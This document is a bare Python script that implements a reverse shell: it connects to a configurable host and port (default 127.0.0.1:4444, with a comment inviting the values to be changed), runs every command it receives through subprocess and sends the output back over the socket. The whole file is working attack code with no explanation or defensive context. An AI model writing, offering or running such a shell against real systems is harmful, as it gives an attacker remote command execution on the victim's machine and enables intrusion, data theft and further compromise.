import socket,subprocess

#Change these if needed
HOST = '127.0.0.1'
PORT = 4444
#

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect((HOST,PORT))

while True:
	dat = s.recv(1024)
	respcom = subprocess.getoutput(dat)
	if b"exit" in dat:
		break
	s.sendall(("=> " + respcom + "\n#: ").encode())
